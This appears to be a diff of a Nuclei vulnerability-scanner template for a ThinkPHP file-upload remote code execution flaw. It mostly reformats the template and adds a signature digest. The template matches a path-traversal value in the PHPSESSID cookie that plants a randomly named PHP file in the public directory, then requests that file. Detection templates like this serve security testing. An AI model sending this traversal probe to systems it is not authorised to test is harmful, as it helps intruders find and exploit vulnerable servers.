@@ -21,9 +21,20 @@ info:
     zoomeye-query: app="ThinkPHP"
   tags: file-upload,rce,thinkphp,vuln
 variables:
-  random_filename: "{{to_lower(rand_base(11))}}"
+  random_filename: '{{to_lower(rand_base(11))}}'
 http:
-  - raw:
+  - matchers:
+      - part: header_1
+        type: word
+        words:
+          - 'Set-Cookie: PHPSESSID=%2F..%2F..%2F..%2Fpublic%2F{{random_filename}}.php'
+      - dsl:
+          - status_code_2 == 200
+        # digest: 4a0a004730450220267e71a7a0b799bcd5d0d46ba12d693ca790fb0636655bcd8d8369d3926e2e35022100cf39130796e23979e76c4ce521456de35cdaa1b6f11c303c1e3ab30845818b52:922c64590222798bb761d5b6d8e72950
+
+        type: dsl
+    matchers-condition: and
+    raw:
       - |
         GET / HTTP/1.1
         Host: {{Hostname}}
@@ -32,12 +43,3 @@ http:
       - |
         GET /{{random_filename}}.php HTTP/1.1
         Host: {{Hostname}}
-    matchers-condition: and
-    matchers:
-      - type: word
-        part: header_1
-        words:
-          - "Set-Cookie: PHPSESSID=%2F..%2F..%2F..%2Fpublic%2F{{random_filename}}.php"
-      - type: dsl
-        dsl:
-          - "status_2 == 200"
